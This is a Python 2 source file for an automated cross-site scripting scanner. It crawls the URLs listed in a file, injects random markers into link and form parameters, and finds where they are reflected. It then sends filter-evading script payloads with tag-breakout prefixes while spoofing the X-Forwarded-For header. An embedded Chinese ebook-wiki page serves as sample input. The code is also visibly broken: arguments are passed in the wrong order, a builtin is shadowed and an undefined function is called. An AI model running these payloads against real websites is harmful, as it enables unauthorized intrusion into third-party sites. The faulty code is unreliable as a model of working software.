# -*- coding:utf-8 -*-
import Queue
import code
from cookielib import domain_match
import httplib
from random import random
import re
import socket
import sys
import time
import urllib
import urllib2
import os
from PyQt4.QtGui import * 


import MySQLdb
from bs4 import BeautifulSoup
from tld import get_tld 

import random, string
from test.test_bigmem import character_size
import XssDetection


timeout = 10    
socket.setdefaulttimeout(timeout)



reload(sys)
sys.setdefaultencoding( "utf-8" )


xss_list=['<Script>alert(xss)<sCript>','<scr%00ipt>alert(xss)<scr%00ipt>','<<script>alert(xss)</script>','xss%00<script>alert(xss)</script>','']



html='''


<html>

<head>

  <title>亿年书海 - 电子书 wiki 网</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="亿年书海网络书籍编辑与分享平台，生成精美 PDF 和 EPUB 电子书。Online book sharing wiki site with auto PDF or EPUB generation for ebook devices.">
  <meta name="keywords" content="亿年书海, 电子书, online sharing, Wiki, book, wikibook, epub, PDF, download, e-book, e-reader, e-book devices, reader, iliad, M218A, Sony Reader">

  <link rel="stylesheet" type="text/css" href="/style/main.css" />
  <link rel="stylesheet" type="text/css" href="/style/page.css" />
  <link rel="stylesheet" type="text/css" href="/style/ui.css" />
  <link rel="stylesheet" type="text/css" href="/style/viewer.css" />
  <link rel="alternate stylesheet" type="text/css" href="/style/xx-small.css" title="A--" />
  <link rel="alternate stylesheet" type="text/css" href="/style/x-small.css" title="A-" />
  <link rel="alternate stylesheet" type="text/css" href="/style/small.css" title="A" />
  <link rel="alternate stylesheet" type="text/css" href="/style/medium.css" title="A+" />
  <link rel="alternate stylesheet" type="text/css" href="/style/large.css" title="A++" />
  <link rel="stylesheet" type="text/css" href="/style/plugins.css" />

  <script type="text/javascript" src="/js/jquery-1.3.2.min.js"></script>
  <script type="text/javascript" src="/js/jquery.address-1.0.min.js"></script>
  <script type="text/javascript" src="/js/utils.js"></script>
  <script type="text/javascript" src="/js/ui.js"></script>
  <script type="text/javascript" src="/js/styleswitcher.js"></script>
  <script type="text/javascript" src="/js/app.js"></script>

</head>

<body>

  <div class="page">
     <div id="main">

<!-- ====================================================================== -->

        <div id="ui">

          <!-- info section -->
          <!-- toolbar section -->
          <div id="toolbar">
            <!--table><tr><td><a href="/w/#Index.html" class="Reference" rel="address:/Index"><img border="0" src="../img/inien.gif"></a></td>
            <td style="text-align:right;">
            <a id="auth-btn"      class="collapser" target="#auth">登录</a>
            <a id="signup-btn"    class="collapser" target="#signup">注册</a>
            <a id="format-btn"    class="collapser" target="#format">下载</a>
            <a id="edit-btn"      class="collapser" target="#editor">编辑</a>
            <a id="history-btn"   class="collapser" target="#history">历史</a>
            <a id="whatsnew-btn"  class="collapser" target="#history">动态</a>
            <a id="tagging-btn"   class="collapser disabled" target="#tagging">标签</a>
            <a id="searchbar-btn" class="collapser" target="#search">搜索</a>
            </td></tr></table-->
            <a href="/w/#Index.html" class="Reference" rel="address:/Index"><img border="0" class="front-layer" src="../img/inien.gif"></a>
            <div class="menu back-layer">
            <a id="auth-btn"      class="collapser" target="#auth">登录</a>
            <a id="signup-btn"    class="collapser" target="#signup">注册</a>
            <a id="format-btn"    class="collapser" target="#format">下载</a>
            <a id="edit-btn"      class="collapser" target="#editor">编辑</a>
            <a id="history-btn"   class="collapser" target="#history">历史</a>
            <a id="whatsnew-btn"  class="collapser" target="#history">动态</a>
            <a id="tagging-btn"   class="collapser disabled" target="#tagging">标签</a>
            &nbsp;
            <input name="search terms" enter="search" target="#search-btn" id="search-terms" type="text" value="搜索" title="搜索" />
            <!--a id="searchbar-btn" class="collapser" target="#search">搜索</a-->
          </div>
           </div>

          <!-- auth section -->
          <div id="auth">
            <input id="user-ui" target="#logout-btn, #save-btn, #delete-btn" type="text" />
            <input name="username" enter="login" target="#login-btn" id="username" type="text" value="用户名" title="用户名" />
            <input name="password" enter="login" target="#login-btn" id="password" type="password" value="password" title="password" /><br/>
            <a id="login-btn">登入</a>
            <a id="logout-btn">退出</a>
            <div id="login-status" class="status">&nbsp;</div>
          </div>

          <!-- signup section -->
          <div id="signup">
            <input name="username" id="su-username" enter="signup" target="#create-account-btn" type="text"     value="用户名" title="用户名" />
            <input name="password" id="su-password" enter="signup" target="#create-account-btn" type="password" value="password" title="password" />
            <input name="email"    id="su-email"    enter="signup" target="#create-account-btn" type="text"     value="个人邮箱" title="个人邮箱" /><br/>
            <a id="create-account-btn">注册新用户</a>
            <div id="signup-status" class="status">&nbsp;</div>
          </div>

          <!-- format section -->
          <div id="format">
            <!--span>选择显示格式:
              <a id="txt-btn"   class="option">txt</a>
              <a id="html-btn"  class="option opted">html</a>
              <a id="latex-btn" class="option">latex</a>
              <a id="adt-btn"   class="option">adt</a>
            </span -->
            <span>下载：
              <!--a id="print-btn" target="new">打印</a-->
              <a id="src-btn"  target="new">本页</a>
              <a id="all-src-btn"  target="new">全本</a>
              <a id="pdf-10in-btn" target="new">10.1寸</a>
              <a id="pdf-9in-btn" target="new">9.7寸</a>
              <a id="pdf-8in-btn" target="new">8寸</a>
              <a id="pdf-6in-btn" target="new">6寸</a>
              <a id="pdf-5in-btn" target="new">5寸</a>
              <a id="pdf-psp-btn" target="new">PSP</a>
              <a id="pdf-iliad-btn" target="new">iLiad</a>
              <a id="epub-btn" target="new">EPUB</a>
              <a id="pdf-custom-btn" class="collapser" target="#customizer">自定义</a>
           </span>
          </div>

          <!-- customize section -->
          <div id="customizer">
            <span>
              格式：
              <select id="pagesize" name="pagesize" onChange="javascript:saveCustomSetting();">
                <option value='10in'>20.7cm x 15.5cm (10.1寸)</option>
                <option value='9in'>20.3cm x 14cm (9.7寸)</option>
                <option value='8in'>12cm x 14.7cm (八寸)</option>
                <option value='6in'>9cm x 11.6cm (六寸)</option>
                <option value='5in'>7.6cm x 9.8cm (五寸)</option>
                <option value='prs900'>9cm x 15.3cm (PRS-900 专用)</option>
                <option value='psp'>9.5cm x 5.4cm (PSP 专用)</option>
                <option value='epub'>EPUB 通用格式</option>
              </select>
              白边：
              <select id="margin" name="margin" onChange="javascript:saveCustomSetting();">
                <option value='0ma'>左右 0.1 cm 上下 0cm (最小)</option>
                <option value='1ma'>左右 0.2cm 上下 0.1cm (小)</option>
                <option value='2ma'>左右 0.35cm 上下 0.25cm (中)</option>
                <option value='3ma'>左右 0.5cm 上下 0.4cm (大)</option>
              </select>
              行间距：
              <select id="linespread" name="linespread" onChange="javascript:saveCustomSetting();">
                <option value='0ll'>最小</option>
                <option value='1ll'>小</option>
                <option value='2ll'>中</option>
                <option value='3ll'>大</option>
              </select>
              <br>
              字体：
              <select id="fontname" name="fontname" onChange="javascript:saveCustomSetting();">
                <option value='yahei'>微软雅黑</option>
                <option value='fzzys'>方正中雅宋</option>
                <option value='fzkti'>方正楷体</option>
                <option value='fzlib'>方正隶变</option>
                <option value='sony'>PRS-500 专用</option>
              </select>
              字号：
              <select id="fontsize" name="fontsize" onChange="javascript:saveCustomSetting();">
                <option value='7pt'>7 号字</option>
                <option value='8pt'>8 号字</option>
                <option value='9pt'>9 号字</option>
                <option value='10pt'>10 号字</option>
                <option value='11pt'>11 号字</option>
                <option value='12pt'>12 号字</option>
                <option value='13pt'>13 号字</option>
                <option value='14pt'>14 号字</option>
              </select>
              段间距：
              <select id="parskip" name="parskip" onChange="javascript:saveCustomSetting();">
                <option value='0pp'>最小</option>
                <option value='1pp'>小</option>
                <option value='2pp'>中</option>
                <option value='3pp'>大</option>
              </select>
              <br>
              目录：
              <select id="toc" name="toc" onChange="javascript:saveCustomSetting();">
                <option value='toc'>制作章节目录索引</option>
                <option value='notoc'>不制作目录</option>
              </select>
              页眉：
              <select id="header" name="header" onChange="javascript:saveCustomSetting();">
                <option value='fancy'>显示文件名章节名</option>
                <option value='plain'>不制作页眉</option>
              </select>
            </span><br>
            <a id="custom-btn" target="new">下载自定义格式</a>
          </div>

          <!-- history section -->
          <div id="history">
            <div id="history-status" class="status">&nbsp;</div>
            <div id="history-results"></div>
          </div>

          <!-- editor section -->
          <div id="editor">
            <textarea id="editField" rows="15" cols="40"></textarea>
            <input name="change description" target="#save-btn, #delete-btn, #rename-btn" id="change" type="text" value="简短注解" title="简短注解" />
            <input name="document name" target="#rename-btn" id="rename" type="text" value="文档名" title="文档名" />
            <a id="save-btn">存档</a>
            <a id="preview-btn">预览</a>
            <a id="insertbreak-btn">中文段落自动整理</a>
            <a id="removespace-btn">清除段首英文空格</a>
            <!--a id="delete-btn">删除</a-->
            <!--a id="rename-btn">更名</a-->
            <div id="edit-status" class="status">&nbsp;</div>
          </div>

          <!-- search section -->
          <div id="search">
            <br>
            <a id="search-prev-btn" class="disabled">前次搜索结果</a>
            <a id="search-next-btn" class="disabled">更多搜索结果</a>
            <div id="search-status" class="status">&nbsp;</div>
            <div id="search-results"></div>
          </div>

          <div id="info">
            <span style="float: right;">用户：<span id="user"></span></span>
            文档：<span id="document"></span>&nbsp;&nbsp;&nbsp;&nbsp;
            <span id="revision"></span>
            <!-- author:   <span id="author"></span> -->
          </div>

        </div>

<!-- ====================================================================== -->


          <span id="togglebar">
          <a id="full-btn" class="collapser open" target="#ui">工具栏</a>
          <a id="smaller-btn">小字号</a> <a id="larger-btn">大字号</a>
          </span>
          <img id="loading" src="../img/loading.gif">

        <div id="viewer">
          <div id="rich-viewer"></div>
        </div>

<!-- ====================================================================== -->

      </div>
  <center><p style="font-size: 0.7em">&copy; 2007-2009 版权归各文档作者所有，所有言论本站概不负责。<br>建议使用 Firefox 3.0, Opera 9.6, Safari 3.0 或以上版本。</p></center>
 </div>
</body>
</html>





'''


class injection_point_analysis:
    global html,soup
    def __init__(self,html):
        self.html=html
        
    def analysis(self):
        soup=BeautifulSoup(html)
        for url in soup.find_all('input',value=''):
            print url
        print '\n'
            
    def extract_url(self):
        #links = re.findall('"((http|ftp)s?://(\w)+(\?\w+=.)$)"', html)
        
        global domain
        user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0'
        
        
        
        soup = BeautifulSoup(html)
#         for links in soup.findAll('a'):
#             
#             print links.get('href')
#             
#             links=links.get('href')
#             if links!=None:
#                 pattern=re.compile(r"(.*)?(\w+)=")
#                 if re.match(pattern,links):
#                     print 'adfdf'
#                 else :
#                     print 'zzzzzzz'           
#             
#             
#             print '\n'

        for links in soup.findAll("a",href=re.compile(r"(.*)?(\w+)=")):
            #print re.match(re.compile(r'".*"?'),links)
            links=links.get('href')
            #print links
            
            temp=re.match(re.compile(r"^/(.*)", re.S),links)
            if temp!=None:
                #print temp.group(0)
                links=domain+temp.group(1)
                #print links
            
            
            url=links.split('?')[0]+'?'
            links1=links.split('?')[-1]
            #print url
            #print  links1
            
            
            i=0
            for param in links1.split('&'):
               
                #print param.split('=')[0]
                if i==0:
                    str1="".join(map(lambda xx:(hex(ord(xx))[2:]),os.urandom(3)))
                    #url+=param.split('=')[0]+"=<script>alert('"+str+"');</script>&"
                    url+=param.split('=')[0]+"="+str1+"&"
                else:
                    url+=param.split('=')[0]+"= &"
                    
                i=i+1
            
            url=re.sub(re.compile(r'&$', re.S),"",url)
            #print url
            
            
            try:
                headers={'User-Agent' : user_agent,'Referer':url,'X-Forwarded-For':'10.0.0.1'}
                request = urllib2.Request(url,headers = headers)
                response = urllib2.urlopen(request,timeout=5)
                #print response.code
                 
                
                html=response.read()
                
                
                
                a=self.dispose_extract(str1,url,html,"get")
                
                
                
                
                
                
                 
#                 #print str1
#                 soup=BeautifulSoup(data)
#                 
# #                 if soup.find_all(text=str1):
# #                     print soup.find_all(text=str1)
# 
#                 for tag in soup.find_all(text=str1):
#                     print tag.name
                    
                    
                
                   
                
                    
                
#                 temp=re.search(re.compile(str1, re.S),data)
#                 if temp!=None:
#                     #print url,'   llllllll'
#                     print url
             
            except urllib2.HTTPError,e:
                continue
             
            except urllib2.URLError,e:
                continue
            except ValueError,e:
                continue
            
            
            
#         for links in soup.findAll('iframe'):
#             
#             print links.get('src')
#             
#             links=links.get('src')
#             if links!=None:
#                 pattern=re.compile(r"(.*)?(\w+)=")
#                 if re.match(pattern,links):
#                     print 'adfdf'
#                 else :
#                     print 'zzzzzzz'           
#             
#             
#             print '\n'
                                                                             
    
    def dispose_extract(self,random,url,html,method):
        str1=random
        #re.compile(r"(<(?P<tag>^\s)*(.*)>?)"+str1+"<.*>?", re.S)
        
        #url=
        
        
        result1=re.search(re.compile(r"<([\w]*)([^>]*)>([^<]*)"+str1+"([^>]*)<[^>]+>", re.S), html)
        if result1:
            result1=result1.group(1)
            if result1=='title':
                self.attack(url,1,random,method)
                #pass
            elif result1=='textarea':
                self.attack(url,2,random,method)
                #pass
            elif result1=='iframe':
                self.attack(url,3,random,method)
                #pass
            elif result1=='div' or result1=='h1' or result1=='td' or result1=='th' or result1=='li' or result1=='span' or result1=='a':
                self.attack(url,4,random,method)
                #pass
            elif result1=='script':
                self.attack(url,5,random,method)
                #pass
            else:
                print result1
        else:
            result1=re.search(re.compile(r"<([\w]*)([^>]*?)([\w]*?)=\""+str1+"\"([^>]*?)>",re.S),html)
            if result1:
                if result1.group(1)=='input' and result1.group(3)=='value':
                    self.attack(url, 7, random,method)
                    #pass
                elif result1.group(1)=='a' and result1.group(3)=='href':
                    self.attack(url, 8, random,method)
                    #pass
                else:
                    #self.attack(url, 7, random)
                    pass
                
    
    
    def attack(self,character,url,random,method):
        
        i=0
        len=len(xss_list)
        
        if character==1:
            
            basic='</title>'
            
        elif character==2:
            basic='</textarea>'
        elif character==3:
            basic='</iframe>'
        elif character==4:
            basic='</textarea>'
        elif character==5:
            basic='</textarea>'
        elif character==7:
            basic='">'
        elif character==8:
            basic='</textarea>'
        
        
        if method=='get':
            
            
            while(i<len):
                
                attack_vector=basic+xss_list[i]
                url=re.sub(re.compile(random),attack_vector,url)
                
                i=i+1
                
                try:
                    request = urllib2.Request(url)
                    response = urllib2.urlopen(request,timeout=5)
                    data=response.read()
                    if re.search(re.compile(attack_vector, re.S), data):
                        print u'存在'
                        break
                    
                        
                except urllib2.URLError, e:
                    if hasattr(e,"code"):
                        #print e.code
                        #print 'zxxxxxzzzz'
                        
                        if e.code=='403':
                            is_limit_frequence=True
                         #   print is_limit_frequence
                            print 'hehe'
            
                            #getURL(url)
                    if hasattr(e,"reason"):
                        is_limit_frequence=True
                        print e.reason
                        print 'aarrrraaaaa'
                        if e.reason=='Forbidden':
                            return getURL(url)
                        
        elif method=='post':
            pass
                       # is_limit_frequence=True
                       
#         elif character==2:
#             
#                 
#                 
#                         
#                          
#                         #getURL(url)
#             
#             print url
#             
#         elif character==2:
#             attack_vector='</textarea><script>alert("xss bug")</script>'
#             url=re.sub(re.compile(random),attack_vector,url)
#             print url
#             
#         elif character==3:
#             attack_vector='</iframe><script>alert("xss bug")</script>'
#             url=re.sub(re.compile(random),attack_vector,url)
#             print url
#         
#         elif character==4:
#             attack_vector='<script>alert("xss bug")</script>'
#             url=re.sub(re.compile(random),attack_vector,url)
#             print url
#             
#         elif character==5:
#             attack_vector=':alert("xss bug")'
#             
#             url=re.sub(re.compile(random),attack_vector,url)
#             print url
#             
#         elif character==7:
#             attack_vector='"><script>alert("xss bug")</script>'
#             
#             url=re.sub(re.compile(random),attack_vector,url)
#             print url
#             
#         elif character==8:
#             attack_vector='javascript:alert(xss bug)'
#             url=re.sub(re.compile(random),attack_vector,url)
#             print url
            
            
            
#     def distortion(self,url):
#         url=
            
        
            
    
    def extract_form(self):
        #links = re.findall('"((http|ftp)s?://(\w)+(\?\w+=.)$)"', html)
        #d=[]
        data={}
        soup = BeautifulSoup(html)
        for links in soup.findAll('form'): 
            action=links.get('action')
            method=links.get('method')
            if action==r'^/':
                print 'lalalallaal'
                
            str1="".join(map(lambda xx:(hex(ord(xx))[2:]),os.urandom(3)))     
            
            if method=='post':
                url=action
                for link in links.findAll('input'):
                    if link.get('name')!=None:
                        data[link.get('name')]=str1
                test_data=urllib.urlencode(data)
                user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0'
                headers={'User-Agent' : user_agent,'Referer':url,'X-Forwarded-For':'10.0.0.1'}
                request = urllib2.Request(url,data=test_data,headers = headers)
                response = urllib2.urlopen(request,timeout=5)
                html=response.read()
                self.dispose_extract(str1,url,html,'post')
                                
            else:
                url=action+'?'
                i=0
                for link in links.findAll('input'):
                    if link.get('name')!=None:
                        if i==0:                      
                            url+=link.get('name')+"="+str1+"&"
                        else:
                            url+=link.get('name')+"= &"
                        i=i+1   
                    
                
                user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0'
                headers={'User-Agent' : user_agent,'Referer':url,'X-Forwarded-For':'10.0.0.1'}
                request = urllib2.Request(url,headers = headers)
                response = urllib2.urlopen(request,timeout=5)
                
                html=response.read()
                self.dispose_extract(str1,url,html,'get')    
                        
                print url
            
    def extract_tag_attr(self):
        pass
    def extract_tag_event(self):
        soup = BeautifulSoup(html)
        def has_class_but_no_id(tag):
            return tag.has_attr('onclick') or  tag.has_attr('onerror') or tag.has_attr('onMouseover')
        for links in soup.find_all(has_class_but_no_id):
            print links
            
            
    
            
    def extract_css(self):
        soup = BeautifulSoup(html)
        #r1=re.compile(r'url\((.*?\".*?\").+?\).*')
        r1=re.compile(r'url\(')
        for links in soup.find_all(style=r1):
            print links
    
                 
#             for children in  links.children:
#                 print children
                
    #def dispose_form(self):
        
                
                
            
# class hole_detection:
#     global test_data
#     test_data=urllib.urlencode({
# 'search_theme_form':'yes',
# 'custom_search_types':'c-sentence',
# 'op':'搜索',
# 'form_build_id':'form-c1eea04f494b3bd5118eb11da7341494',
# 'form_id':'search_theme_form',
# 'default_text':'搜索美句佳句、经典语录、名人名言'})
# #})
#     
#     #print type(test_data)
#     global url
#     def __init__(self,url):
#         #self.data=data
#         self.url=url
#     def hole(self):
#         request = urllib2.Request(self.url,data=test_data)
#         response = urllib2.urlopen(request,timeout=30)
#         print response.read()
    



if __name__=='__main__':
    #print html
    f=open("url.txt","r")
    for url in f.readlines():
        #print url.strip()
        domain=get_tld(url.strip(),fail_silently=True)
        ##print 'safjaklf'
        try:
            request = urllib2.Request(url.strip())
            response = urllib2.urlopen(request,timeout=5)
            html=response.read()
            #print html
            a=injection_point_analysis(html)
        #a.__init__(html1)
        #a.analysis()
            a.extract_url()
        
        except socket.error:
            errno, errstr = sys.exc_info()[:2]
            continue
        
           
        except urllib2.URLError, e:
            if hasattr(e,"code"):
            #print e.code
            #print 'zxxxxxzzzz'
            
                if e.code=='403':
                    is_limit_frequence=True
             #   print is_limit_frequence
                    print 'hehe'

                #getURL(url)
            if hasattr(e,"reason"):
                print e.reason
               # is_limit_frequence=True
                print 'aarrrraaaaa'
                
            continue
            #getURL(url)
    
        except httplib.BadStatusLine as e:
        
            if hasattr(e,"reason"):
                print e.reason
            else:
                print 'www'
             
                
            continue
        
    f.close()
    
    
    #a.extract_form()
    
    #a.extract_tag_event()
    #a.extract_css()
    
    #print html
    
#     b=hole_detection('http://www.juzimi.com/')
#     b.hole()